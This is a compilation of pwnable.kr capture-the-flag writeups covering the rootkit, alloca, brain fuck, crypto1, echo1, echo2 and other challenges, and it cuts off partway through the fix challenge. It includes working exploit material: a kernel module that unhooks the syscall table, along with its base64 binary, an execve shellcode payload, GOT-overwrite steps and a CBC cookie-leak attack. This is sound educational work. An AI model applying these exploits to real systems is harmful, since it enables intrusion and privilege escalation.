<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-doublelabyrinth
description: CTF writeups and security challenges by DoubleLabyrinth.
---

# Writeups by DoubleLabyrinth

Source repository: `/repos/DoubleLabyrinth`

## Repository Index

- pwnable.kr/README.md
- pwnable.kr/Toddler's Bottle/asm/README.md
- pwnable.kr/Toddler's Bottle/blackjack/README.md
- pwnable.kr/Toddler's Bottle/blukat/README.md
- pwnable.kr/Toddler's Bottle/bof/README.md
- pwnable.kr/Toddler's Bottle/cmd1/README.md
- pwnable.kr/Toddler's Bottle/cmd2/README.md
- pwnable.kr/Toddler's Bottle/codemap/README.md
- pwnable.kr/Toddler's Bottle/coin1/README.md
- pwnable.kr/Toddler's Bottle/collision/README.md
- pwnable.kr/Toddler's Bottle/fd/README.md
- pwnable.kr/Toddler's Bottle/flag/README.md
- pwnable.kr/Toddler's Bottle/horcruxes/README.md
- pwnable.kr/Toddler's Bottle/input/README.md
- pwnable.kr/Toddler's Bottle/leg/README.md
- pwnable.kr/Toddler's Bottle/lotto/README.md
- pwnable.kr/Toddler's Bottle/memcpy/README.md
- pwnable.kr/Toddler's Bottle/mistake/README.md
- pwnable.kr/Toddler's Bottle/passcode/README.md
- pwnable.kr/Toddler's Bottle/random/README.md
- pwnable.kr/Toddler's Bottle/shellshock/README.md
- pwnable.kr/Toddler's Bottle/uaf/README.md
- pwnable.kr/Toddler's Bottle/unlink/README.md
- pwnable.kr/Rookiss/alloca/README.md
- pwnable.kr/Rookiss/brain fuck/README.md
- pwnable.kr/Rookiss/crypto1/README.md
- pwnable.kr/Rookiss/dragon/README.md
- pwnable.kr/Rookiss/echo1/README.md
- pwnable.kr/Rookiss/echo2/README.md
- pwnable.kr/Rookiss/fix/README.md
- pwnable.kr/Rookiss/fsb/README.md
- pwnable.kr/Rookiss/loveletter/README.md
- pwnable.kr/Rookiss/md5 calculator/README.md
- pwnable.kr/Rookiss/otp/README.md
- pwnable.kr/Rookiss/simple login/README.md
- pwnable.kr/Rookiss/syscall/README.md
- pwnable.kr/Rookiss/tiny_easy/README.md
- pwnable.kr/Grotesque/rootkit/README.md
- pwnable.kr/Grotesque/wtf/README.md

## Writeup Content


### File: pwnable.kr/Grotesque/rootkit/README.md

# pwnable.kr -- Grotesque -- rootkit

## 1. Challenge

```
Server admin says he can't access a file even if he has root.
Can you access the file?

Download : http://pwnable.kr/bin/rootkit

ssh rootkit@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Download the binary and drop it into IDA. You will find it is a kernel module and it will modify values at 

```
// SYS_CALL_TABLE = 0xC15FA020
&SYS_CALL_TABLE[SYS_open]
&SYS_CALL_TABLE[SYS_openat]
&SYS_CALL_TABLE[SYS_symlink]
&SYS_CALL_TABLE[SYS_symlinkat]
&SYS_CALL_TABLE[SYS_link]
&SYS_CALL_TABLE[SYS_linkat]
&SYS_CALL_TABLE[SYS_rename]
&SYS_CALL_TABLE[SYS_renameat]
```

to custom functions, which as known as is hooked.

All of hooking functions filters paths that have substring `"flag"` so all of operations like opening `flag` file, renaming `flag` file, creating symbol-link to `flag` file will fail.

Fortunately, we are logined as root and we can load our custom kernel module to recover `SYS_CALL_TABLE`.

```c
// solve.c
#include <linux/module.h>
#include <linux/kernel.h>

#define SYS_CALL_TABLE ((void**)0xC15FA020)
#define SYS_open 5
#define sys_open ((void*)0xc1158d70)

int init_module(void) {
    // disable write-protection
    __asm__ __volatile__(
        "cli;"
        "mov %cr0, %eax;"
        "and $0xFFFEFFFF, %eax;"
        "mov %eax, %cr0;"
    );

    SYS_CALL_TABLE[SYS_open] = sys_open;

    // enable write-protection
    __asm__ __volatile__(
        "mov %cr0, %eax;"
        "or $0x10000, %eax;"
        "mov %eax, %cr0;"
        "sti;"
    );
    return 0;
}

void cleanup_module(void) {

}
```

In Ubuntu 16.04 32-bit, download and install linux 3.7.1 kernel headers before compiling our kernel module.

```console
$ wget 'https://kernel.ubuntu.com/~kernel-ppa/mainline/v3.7.1-raring/linux-headers-3.7.1-030701-generic_3.7.1-030701.201212171620_i386.deb'

$ wget 'https://kernel.ubuntu.com/~kernel-ppa/mainline/v3.7.1-raring/linux-headers-3.7.1-030701_3.7.1-030701.201212171620_all.deb'

$ sudo dpkg -i ./linux-headers-3.7.1-030701-generic_3.7.1-030701.201212171620_i386.deb ./linux-headers-3.7.1-030701_3.7.1-030701.201212171620_all.deb
```

Then compile

```console
$ make all
```

You will get some files:

```console
total 148
drwxrwxr-x 3 doublesine doublesine  4096 Feb 22 01:28 .
drwxr-xr-x 3 doublesine doublesine  4096 Feb 21 23:58 ..
-rw-rw-r-- 1 doublesine doublesine 47114 Feb 21 23:38 .cache.mk
-rw-rw-r-- 1 doublesine doublesine   161 Feb 21 23:52 Makefile
-rw-rw-r-- 1 doublesine doublesine    47 Feb 22 01:28 modules.order
-rw-rw-r-- 1 doublesine doublesine     0 Feb 22 01:28 Module.symvers
-rw-rw-r-- 1 doublesine doublesine   592 Feb 22 00:55 solve.c
-rw-rw-r-- 1 doublesine doublesine  2248 Feb 22 01:28 solve.ko
-rw-rw-r-- 1 doublesine doublesine   275 Feb 22 01:28 .solve.ko.cmd
-rw-rw-r-- 1 doublesine doublesine   663 Feb 22 01:28 solve.mod.c
-rw-rw-r-- 1 doublesine doublesine  1764 Feb 22 01:28 solve.mod.o
-rw-rw-r-- 1 doublesine doublesine 28195 Feb 22 01:28 .solve.mod.o.cmd
-rw-rw-r-- 1 doublesine doublesine  1460 Feb 22 01:28 solve.o
-rw-rw-r-- 1 doublesine doublesine 28092 Feb 22 01:28 .solve.o.cmd
```

The binary file of our module is `solve.ko`. We can use base64 to upload our kernel module to target machine.

```console
$ base64 ./solve.ko
f0VMRgEBAQAAAAAAAAAAAAEAAwABAAAAAAAAAAAAAAAgBgAAAAAAADQAAAAAACgAEQAOAAQAAAAU
AAAAAwAAAEdOVQDg82MWvvmFraAIxHhpiLY0t0wxRAAAAAAAAAAAVYnl6Pz////6DyDAJf///v8P
IsDHBTSgX8FwjRXBDyDADQAAAQAPIsD7McBdw2aQVYnl6Pz///9dwwAAAwAAADMAAABzcmN2ZXJz
aW9uPUVCRDlGNjk3NUE0QkI1QkRDRDA2QTJEAGRlcGVuZHM9AHZlcm1hZ2ljPTMuNy4xLTAzMDcw
MS1nZW5lcmljIFNNUCBtb2RfdW5sb2FkIG1vZHZlcnNpb25zIDY4NiAAAAAAAAAAAAAAAAAAAAAA
AAAAiI2b021vZHVsZV9sYXlvdXQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAJoPObRtY291bnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABzb2x2ZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAR0NDOiAoVWJ1bnR1L0xpbmFybyA0LjcuNC0zdWJ1bnR1MTIpIDQuNy40AABHQ0M6IChVYnVu
dHUvTGluYXJvIDQuNy40LTN1YnVudHUxMikgNC43LjQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAMAAQAAAAAAAAAAAAAAAAADAAIAAAAAAAAAAAAAAAAAAwAEAAAAAAAAAAAAAAAAAAMABgAA
AAAAAAAAAAAAAAADAAcAAAAAAAAAAAAAAAAAAwAIAAAAAAAAAAAAAAAAAAMACQAAAAAAAAAAAAAA
AAADAAsAAAAAAAAAAAAAAAAAAwAMAAAAAAAAAAAAAAAAAAMADQABAAAAAAAAAAAAAAAEAPH/CQAA
AAAAAAAAAAAABADx/xUAAAAAAAAAIwAAAAEABgAoAAAAIwAAAAkAAAABAAYAOQAAAAAAAACAAAAA
AQAHAEYAAAAsAAAAPgAAAAEABgBWAAAAAAAAAIABAAARAAkAZAAAADAAAAAKAAAAEgACAHMAAAAA
AAAALgAAABIAAgB/AAAAAAAAAAAAAAAQAAAAAHNvbHZlLmMAc29sdmUubW9kLmMAX19tb2Rfc3Jj
dmVyc2lvbjMwAF9fbW9kdWxlX2RlcGVuZHMAX19fX3ZlcnNpb25zAF9fbW9kX3Zlcm1hZ2ljNQBf
X3RoaXNfbW9kdWxlAGNsZWFudXBfbW9kdWxlAGluaXRfbW9kdWxlAG1jb3VudAAAAAQAAAACFAAA
NAAAAAIUAAAAAAAAAQIAAAQAAAABAgAA2AAAAAETAAB4AQAAARIAAAAuc3ltdGFiAC5zdHJ0YWIA
LnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAucmVsLnRleHQALnJlbF9fbWNvdW50X2xvYwAu
bW9kaW5mbwBfX3ZlcnNpb25zAC5kYXRhAC5yZWwuZ251LmxpbmtvbmNlLnRoaXNfbW9kdWxlAC5i
c3MALmNvbW1lbnQALm5vdGUuR05VLXN0YWNrAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAADQAAAAkAAAAAAAAAAAAAAAEAAAAAAAAADIAAAAB
AAAABgAAAAAAAABgAAAAOgAAAAAAAAAAAAAAEAAAAAAAAAAuAAAACQAAAEAAAAAAAAAAUAUAABAA
AAAPAAAAAgAAAAQAAAAIAAAAPAAAAAEAAAACAAAAAAAAAJwAAAAIAAAAAAAAAAAAAAAEAAAAAAAA
ADgAAAAJAAAAQAAAAAAAAABgBQAAEAAAAA8AAAAEAAAABAAAAAgAAABJAAAAAQAAAAIAAAAAAAAA
pAAAAGoAAAAAAAAAAAAAAAEAAAAAAAAAUgAAAAEAAAACAAAAAAAAACABAACAAAAAAAAAAAAAAAAg
AAAAAAAAAF0AAAABAAAAAwAAAAAAAACgAQAAAAAAAAAAAAAAAAAAAQAAAAAAAABnAAAAAQAAAAMA
AAAAAAAAoAEAAIABAAAAAAAAAAAAACAAAAAAAAAAYwAAAAkAAABAAAAAAAAAAHAFAAAQAAAADwAA
AAkAAAAEAAAACAAAAIEAAAAIAAAAAwAAAAAAAAAgAwAAAAAAAAAAAAAAAAAAAQAAAAAAAACGAAAA
AQAAADAAAAAAAAAAIAMAAFgAAAAAAAAAAAAAAAEAAAABAAAAjwAAAAEAAAAAAAAAAAAAAHgDAAAA
AAAAAAAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAACABQAAnwAAAAAAAAAAAAAAAQAAAAAA
AAABAAAAAgAAAAAAAAAAAAAAeAMAAFABAAAQAAAAEQAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAA
AMgEAACGAAAAAAAAAAAAAAABAAAAAAAAAA==

// ssh rootkit@pwnable.kr -p2222

$ cd tmp

$ cat > solve.ko.b64
// paste base64 string you get to here

$ base64 -d ./solve.ko.b64 > ./solve.ko

$ insmod ./solve.ko
```

Now our kernel module has been loaded, let's see flag directly.

```console
$ cat /flag
// some unrecognizable characters
// it should be binary file
// use base64 to dump out

$ base64 /flag
...
...

// switch to our machine

$ cat > flag.b64
// paste here

$ base64 -d ./flag.b64 > ./flag

$ binwalk ./flag
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             gzip compressed data, from Unix, last modified: 2015-07-24 16:54:31

$ mv ./flag ./flag.gz

$ tar -xvzf ./flag.gz

$ cat flag
... // you will get flag here
```




### File: pwnable.kr/Grotesque/wtf/README.md

# pwnable.kr -- Grotesque -- rootkit

## 1. Challenge

```
I don't understand why my exploit is not working.
I need your help.

download : http://pwnable.kr/bin/wtf
download : http://pwnable.kr/bin/wtf.py

Running at : nc pwnable.kr 9015
```

## 2. Solution

Hint:

The buffer size of `scanf` is 4096 bytes. 

Bytes after the first 4096 bytes will not be read to `scanf`'s buffer and they will be read in the next `read` call.

```console
$ ./solve.py 
[+] Opening connection to pwnable.kr on port 9015: Done

    ---------------------------------------------------
    -              Shall we play a game?              -
    ---------------------------------------------------
    
    Hey~, I'm a newb in this pwn(?) thing...
    I'm stuck with a very easy bof task called 'wtf'
    I think this is quite easy task, however my
    exploit payload is not working... I don't know why :(
    I want you to help me out here.
    please check out the binary and give me payload
    let me try to pwn this with yours.

                                - Sincerely yours, newb
    
payload please : 
[*] Switching to interactive mode
thanks! let me try if your payload works...
hey! your payload got me this : ********************* // hidden


I admit, you are indeed an expert :)
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to pwnable.kr port 9015
```




### File: pwnable.kr/README.md

# pwnable.kr
pwn challenges in [pwnable.kr](http://pwnable.kr "http://pwnable.kr")  

## 1. Toddler's Bottle
  * [x] fd
  * [x] collision
  * [x] bof
  * [x] flag
  * [x] passcode
  * [x] random
  * [x] input
  * [x] leg
  * [x] mistake
  * [x] shellshock
  * [x] coin1
  * [x] blackjack
  * [x] lotto
  * [x] cmd1
  * [x] cmd2
  * [x] uaf
  * [x] codemap
  * [x] memcpy
  * [x] asm
  * [x] unlink
  * [x] blukat
  * [x] horcruxes

## 2. Rookiss
  * [x] brain fuck
  * [x] md5 calculator
  * [x] simple login
  * [x] otp
  * [ ] ascii_easy
  * [x] tiny_easy
  * [x] fsb
  * [x] dragon
  * [x] fix
  * [x] syscall
  * [x] crypto1
  * [x] echo1
  * [x] echo2
  * [ ] rsa calculator
  * [ ] note
  * [x] alloca
  * [x] loveletter

## 3. Grotesque
  * [ ] proxy server
  * [x] rootkit
  * [ ] dos4fun
  * [ ] ascii
  * [ ] aeg
  * [ ] coin2
  * [ ] maze
  * [x] wtf
  * [ ] sudoku
  * [ ] starcraft
  * [ ] cmd3
  * [ ] elf
  * [ ] lfh
  * [ ] lokihardt
  * [ ] asg
  * [ ] hunter
  * [ ] mipstake

## 4. Hacker's Secret
  * [ ] unexploitable
  * [ ] tiny
  * [ ] softmmu
  * [ ] xml
  * [ ] towelroot
  * [ ] nuclear
  * [ ] malware
  * [ ] exploitable
  * [ ] tiny_hard
  * [ ] kcrc
  * [ ] exynos
  * [ ] combabo calculator
  * [ ] pwnsandbox
  * [ ] crcgen



### File: pwnable.kr/Rookiss/alloca/README.md

# pwnable.kr -- Rookiss -- alloca

## 1. Challenge

> Let me give you a lesson: "How to prevent buffer overflow?"  
>   
> ssh alloca@pwnable.kr -p2222 (pw:guest)  

## 2. Solution

Log in via SSH and see source code:

alloca.c
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void callme(){
        system("/bin/sh");
}

void clear_newlines(){
        int c;
        do{
                c = getchar();
        }while (c != '\n' && c != EOF);
}

int g_canary;
int check_canary(int canary){
        int result = canary ^ g_canary;
        int canary_after = canary;
        int canary_before = g_canary;
        printf("canary before using buffer : %d\n", canary_before);
        printf("canary after using buffer : %d\n\n", canary_after);
        if(result != 0){
                printf("what the ....??? how did you messed this buffer????\n");
        }
        else{
                printf("I told you so. its trivially easy to prevent BOF :)\n");
                printf("therefore as you can see, it is easy to make secure software\n");
        }
        return result;
}

int size;
char* buffer;
int main(){

        printf("- BOF(buffer overflow) is very easy to prevent. here is how to.\n\n");
        sleep(1);
        printf("   1. allocate the buffer size only as you need it\n");
        printf("   2. know your buffer size and limit the input length\n\n");

        printf("- simple right?. let me show you.\n\n");
        sleep(1);

        printf("- whats the maximum length of your buffer?(byte) : ");
        scanf("%d", &size);
        clear_newlines();

        printf("- give me your random canary number to prove there is no BOF : ");
        scanf("%d", &g_canary);
        clear_newlines();

        printf("- ok lets allocate a buffer of length %d\n\n", size);
        sleep(1);

        buffer = alloca( size + 4 );    // 4 is for canary

        printf("- now, lets put canary at the end of the buffer and get your data\n");
        printf("- don't worry! fgets() securely limits your input after %d bytes :)\n", size);
        printf("- if canary is not changed, we can prove there is no BOF :)\n");
        printf("$ ");

        memcpy(buffer+size, &g_canary, 4);      // canary will detect overflow.
        fgets(buffer, size, stdin);             // there is no way you can exploit this.

        printf("\n");
        printf("- now lets check canary to see if there was overflow\n\n");

        check_canary( *((int*)(buffer+size)) );
        return 0;
}
```

We can see that ``alloca()` is call in `main()`. But variable `size` is a signed integer and we can make it negative. So I downloaded the binary file `alloca` and drop it into IDA to see what `alloca()` does. 

```
.text:08048745                 mov     eax, ds:size
.text:0804874A                 add     eax, 4
.text:0804874D                 lea     edx, [eax+0Fh]
.text:08048750                 mov     eax, 10h
.text:08048755                 sub     eax, 1
.text:08048758                 add     eax, edx
.text:0804875A                 mov     ecx, 10h
.text:0804875F                 mov     edx, 0
.text:08048764                 div     ecx
.text:08048766                 imul    eax, 10h
.text:08048769                 sub     esp, eax
.text:0804876B                 mov     eax, esp
.text:0804876D                 add     eax, 0Fh
.text:08048770                 shr     eax, 4
.text:08048773                 shl     eax, 4
.text:08048776                 mov     ds:buffer, eax
```

The assembly code above is the assembly code of `buffer = alloca(size + 4);` which is equilavent to the following C code:

```c
$esp -= (size + 34) / 16 * 16;
buffer = ($esp + 15) / 16 * 16;
```

So if size is less than `-34`, the stack pointer `esp` may goes up which would cause return address modified in the code after `buffer = alloca(size + 4);`.

Before `main()` returns, the last function called is `check_canary()` where canary we set will be read and stored on stack. If we raise `esp` by certain value, the return address of `main()` may replaced by our canary. I tried several times and found we can hijack `esp` when `size` is `-67`.

![](pic1.png)

In the case of the above screenshot, I set canary to `0x7777777` which would be found easily. You can see that `esp` would be set to `canary - 0x4` before `ret` executed.

Now there is a problem. What should `esp` be set to so that program will return to `callme()` and get shell? Well, use __stack-spray__.

Because there is no bytes that is `\xab\x85\x04\x08` in the address space of binary file `alloca` and we cannot predict stack address due to ALSR, I have to use stack-spray. I build many arguments that all looks like `\xab\x85\x04\x08\xab\x85\x04\x08\xab...` and set canary to `0xFFF0DF04`, also `-991484`, then I should get shell if `esp` hit my arguments' buffer. 

```
$ gcc solve.c -o solve

# Try many times and you will get shell
# ps: I tried about 10 times.
$ ./solve
....
.... -67
.... -991484
...
```



### File: pwnable.kr/Rookiss/brain fuck/README.md

# pwnable.kr -- Rookiss -- brain fuck
Try to read items in GOT table and modify them to get shell.

## 1. Challenge
  > I made a simple brain-fuck language emulation program written in C.  
  > The [ ] commands are not implemented yet. However the rest functionality seems working fine.  
  > Find a bug and exploit it to get a shell.  
  >   
  > Download : http://pwnable.kr/bin/bf  
  > Download : http://pwnable.kr/bin/bf_libc.so  
  >   
  > Running at : nc pwnable.kr 9001  

## 2. Solution
  * Download the two binary files, `bf` and `bf_libc.so` and send them to IDA.

  * In `bf`, you can see the program initializes a pointer `p` and receives a brainfuck language string.  
    Then do something in `do_brainfuck` function.  

    In `do_brainfuck` function, we know that:

    |Char |operation |
    |-----|----------|
    |  +  |  ++(\*p) |
    |  -  |  --(\*p) |
    |  ,  |  \*p = getchar() |
    |  .  |  putchar(\*p)    |
    |  <  |  --p     |
    |  >  |  ++p     |

  * So we can use `<` to make the pointer `p` point to `.bss:0804A080 p dd ?` and `.got.plt:0804A010 off_804A010 dd offset fgets`, then use `.` to read the address of the pointer `p` and the address of function `fgets`.

  * After the program leaks the addresses, we can calculate the address of function `main`, `system` and `gets`.

  * Then use `>` and `.` to overwrite some items in GOT table. Exactly:

    ```
    fgets    -->  system
    memset   -->  gets
    putchar  -->  main
    ```

  * Finally, use `.` to call modified `putchar` which actually is `main`.

    Then in function `main`, when calls `memset`, it actually calls `gets`. Just send `/bin/sh`.

    And next it will call `fgets` which actually is `system`, so you can get shell.



### File: pwnable.kr/Rookiss/crypto1/README.md

# pwnable.kr -- Rookiss -- crypto1

## 1. Challenge

> We have isolated the authentication procedure to another box using RPC.  
> The credential information between RPC is encrypted with AES-CBC, so it will be secure enough from sniffing.  
> I believe no one can login as admin but me :p  
>   
> Download : http://pwnable.kr/bin/client.py  
> Download : http://pwnable.kr/bin/server.py  
>   
> Running at : nc pwnable.kr 9006  

## 2. Solution

Download `client.py`:

```python
#!/usr/bin/python
from Crypto.Cipher import AES
import base64
import os, sys
import xmlrpclib
rpc = xmlrpclib.ServerProxy("http://localhost:9100/")

BLOCK_SIZE = 16
PADDING = '\x00'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: c.encrypt(pad(s)).encode('hex')
DecodeAES = lambda c, e: c.decrypt(e.decode('hex'))

# server's secrets
key = 'erased. but there is something on the real source code'
iv = 'erased. but there is something on the real source code'
cookie = 'erased. but there is something on the real source code'

# guest / 8b465d23cb778d3636bf6c4c5e30d031675fd95cec7afea497d36146783fd3a1
def sanitize(arg):
	for c in arg:
		if c not in '1234567890abcdefghijklmnopqrstuvwxyz-_':
			return False
	return True

def AES128_CBC(msg):
	cipher = AES.new(key, AES.MODE_CBC, iv)
	return EncodeAES(cipher, msg)

def request_auth(id, pw):
	packet = '{0}-{1}-{2}'.format(id, pw, cookie)
	e_packet = AES128_CBC(packet)
	print 'sending encrypted data ({0})'.format(e_packet)
	sys.stdout.flush()
	return rpc.authenticate(e_packet)

if __name__ == '__main__':
	print '---------------------------------------------------'
	print '-       PWNABLE.KR secure RPC login system        -'
	print '---------------------------------------------------'
	print ''
	print 'Input your ID'
	sys.stdout.flush()
	id = raw_input()
	print 'Input your PW'
	sys.stdout.flush()
	pw = raw_input()

	if sanitize(id) == False or sanitize(pw) == False:
		print 'format error'
		sys.stdout.flush()
		os._exit(0)

	cred = request_auth(id, pw)

	if cred==0 :
		print 'you are not authenticated user'
		sys.stdout.flush()
		os._exit(0)
	if cred==1 :
		print 'hi guest, login as admin'
		sys.stdout.flush()
		os._exit(0)

	print 'hi admin, here is your flag'
	print open('flag').read()
	sys.stdout.flush()

```

You can see that `client.py` just joins `id`, `pw` and `cookie` with `"-"` and encrypts the joined string with AES-CBC, then sends the ciphertext to `server.py` by RPC. Before sending ciphertext, `client.py` will show the ciphertext to you, which may leak `cookie`.

The first thing we should do is finding out the length of `cookie`. As there is padding, which looks like PKCS5 padding, during the process of encryption, we can try to build many messages that the lengths of are increasing by sending different `id`s and `pw`s.

For example, I sent empty `id` and `pw`. The remote returned a ciphertext

```
---------------------------------------------------
-       PWNABLE.KR secure RPC login system        -
---------------------------------------------------

Input your ID

Input your PW

sending encrypted data (6242e07a0ab2a3f24e922635da556f9267e18342bf8fd63d1dc783fcdde09abc6368a50b0ca6b383d04c77cd7fb44cf1720197ad4c8d45a3175761e37951e00b)
```

which is 64 bytes long. So the length of `cookie` should vary from `64 - 16 - 2 = 46` to `64 - 1 - 2 = 61` where `2` is for 2 join chars `"-"`. Then I sent empty `id` and one char `"-"` as `pw`. The remote returned

```
---------------------------------------------------
-       PWNABLE.KR secure RPC login system        -
---------------------------------------------------

Input your ID

Input your PW
-
sending encrypted data (2d46c1d48d5566429b5d7ba6514d6a3b9d799be938049bfe1e89a0cdfb8b64ca3244b1b6abdd2d578bdf667047c3dcb5ca93ae378594a4dad3528aa51f535129)
```

where the length of the ciphertext is still 64 bytes. Later I tried many times with empty `id` and increasing `pw`. Finally  I got a ciphertext with 80 bytes when I sent empty `id` and `-------------`, 13 chars, as `pw`. 

So there must be

```
13 + 2 + len(cookie) + 16 = 80
len(cookie) = 49
```

After that we can leak `cookie` one by one:

1. Let `id` be empty and `pw` be `"-------------------------------------------------------------"`, 61 chars long.

   So the first 64 chars of the joined message would be

   ```
   ---------------------------------------------------------------X
   ```

   where `"X"` is the first char of `cookie`. 

2. Send `id` and `pw` and you will get a ciphertext `CX`.

3. Let `id` be empty and `pw` be `--------------------------------------------------------------Y`, 63 chars long.

   So the first 64 chars of the joined message would be

   ```
   ---------------------------------------------------------------Y
   ```

4. Send `id` and `pw` and you will get a ciphertext `CY`.

5. If the first 64 bytes of `CX` is the same with the first 64 bytes of `CY`, we can know that the char you guess, `Y`, matches `X`.

Repeat and you will get the whole `cookie`:

```python
cookie = 'you_will_never_guess_this_sugar_honey_salt_cookie'
```

Now calculate `pw` and use it to get flag.

```python
import hashlib
id = 'admin'
cookie = 'you_will_never_guess_this_sugar_honey_salt_cookie'
pw = hashlib.sha256((id + cookie).encode()).hexdigest()
print(pw)
# Output:
# fcf00f6fc7f66ffcfec02eaf69d30398b773fa9b2bc398f960784d60048cc503
```

```
---------------------------------------------------
-       PWNABLE.KR secure RPC login system        -
---------------------------------------------------

Input your ID
admin
Input your PW
fcf00f6fc7f66ffcfec02eaf69d30398b773fa9b2bc398f960784d60048cc503
sending encrypted data (05c4ccfd4880c92339b995c7754ec2e6567f2ed91d955cb7144c1b6037855db1b3a8525e74d30fd4505bb38c975b86f23d0e5aa23eed44b9beaa7e2195da93ba53cb08758a261ada5612245f49d25b81aa5a297aa5d555886073b17e2ed719b3607da6fbfe40b260a45485910404d69c818a2faedac7bb3a727cfbb53eab8406)
hi admin, here is your flag
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```




### File: pwnable.kr/Rookiss/dragon/README.md

# pwnable.kr -- Rookiss -- dragon

## 1. Challenge

```
I made a RPG game for my little brother.
But to trick him, I made it impossible to win.
I hope he doesn't get too angry with me :P!

Author : rookiss
Download : http://pwnable.kr/bin/dragon

Running at : nc pwnable.kr 9004
```

## 2. Solution

A simple UAF exploit. I just give you some hints:

1. When `PriestAttack()` returns, it will free a block of memory allocated for monster. And so does `KnightAttack()`.

2. `PriestAttack()` and `KnightAttack()` will return a BOOL that indicates you win or not. If you win, the application will allocate a block of memory which has the same address with the block freed in `PriestAttack()` or `KnightAttack()`. Then you can write 16 bytes at most which can help you hijack `$eip` and get shell.

   ![](pic0.png)



### File: pwnable.kr/Rookiss/echo1/README.md

# pwnable.kr -- Rookiss -- echo1
Actually, the program do not check whether it does read `passcode`.

So just use `ulimit -f 0` to forbid program write any bytes and `passcode` will must be `0`.

## 1. Challenge
  > Pwn this echo service.  
  >   
  > download : http://pwnable.kr/bin/echo1  
  >   
  > Running at : nc pwnable.kr 9010  

## 2. Solution
  * Download the binary file `echo1` and open it in IDA.

  * In function `echo1`:

    ```cpp
    void __cdecl echo1()
    {
      char buffer[32]; // [rsp+0h] [rbp-20h]

      o->greetings(o->str);
      get_input(buffer, 128);
      puts(buffer);
      o->byebye(o->str);
    }
    ```

    we can see `get_input(buffer, 128);` makes a buffer overflow where the length of `buffer` is 32 bytes and `get_input(buffer, 128);` allows us write 128 bytes at most.

    And after we use `checksec`, we can know that there is no `PIE`, no `NX`, and no `Canary`. So just overflow it and control `RIP`.

  * But where do we set `RIP` to?

    In function `main`, there is a `id = *(_DWORD *)buffer` where `id` is a global variable.

    So we can set `RIP` to the address of `id` which contains the machine code of `amd64` assembly code `jmp rsp`.

    When function `echo1` returns, which means the program runs to `ret`, CPU will pop the address of `id` to register `RIP` then execute `jmp rsp`.

    After that, the program will execute the shellcode after where the address of `id` stores on stack.

  * So, when you input your name, it must start with the machine code of `jmp rsp`.

    And payload can be:

    ```python
    addr_id = 0x00000000006020A0
    payload = b'fuckfuck' * 4 + b'/bin/sh\x00' + pack(addr_id, 64) + shellcode
    ```

    where shellcode is:

    ```python
    sys_execve = 59
    shellcode = asm('xor rsi, rsi') + \
                asm('xor rdx, rdx') + \
                asm('sub rsp, 0x10') + \
                asm('mov rdi, rsp') + \
                asm('mov rax, ' + hex(sys_execve)) + \
                asm('syscall')
    ```

    Send your name which starts with the machine code of `jmp rsp` and choose `1. BOF echo`, then send payload and you will get shell.



### File: pwnable.kr/Rookiss/echo2/README.md

# pwnable.kr -- Rookiss -- echo2

## 1. Challenge

```
Pwn this echo service.

download : http://pwnable.kr/bin/echo2

Running at : nc pwnable.kr 9011
```

## 2. Solution

This one is a little harder than echo1. I just give you some hints:

1. A block of memory, which the global variable `o` points to, could be used after free if you try to exit and cancel exit.

2. You can use function `echo2()` to leak `$rbp` of `main()` and libc's address. Then find out addresses of `system()` and string `/bin/sh`. 

3. Use `echo3()` to trigger UAF so we can go to `main()` again.

4. Write shellcode when application asks you input your name. So the shellcode would be on stack. At the mean time, calculate the address of the shellcode based on the `$rbp` of previous `main()`.

   The shellcode can be

   ```asm
   mov rdi, libc_bin_sh_addr
   mov rax, libc_system
   call rax
   ```

5. Use `echo3()` to trigger UAF again. But this time we go to our shellcode. 

6. You will get shell. Use `cat flag` to get the flag.




### File: pwnable.kr/Rookiss/fix/README.md

# pwnable.kr -- Rookiss -- fix

## 1. Challenge

> Why bother to make your own shellcode?  
> I can simply copy&paste from shell-storm.org  
> so I just copied it from shell-storm then used it for my buffer overflow exercise  
> but it doesn't work :(  
> can you please help me to fix this??  
>   
> ssh fix@pwnable.kr -p2222 (pw:guest)  

## 2. Solution

Log in via SSH and download the binary file `fix` and the corresponding source code `fix.c`.

fix.c:
```c
#include <stdio.h>

// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
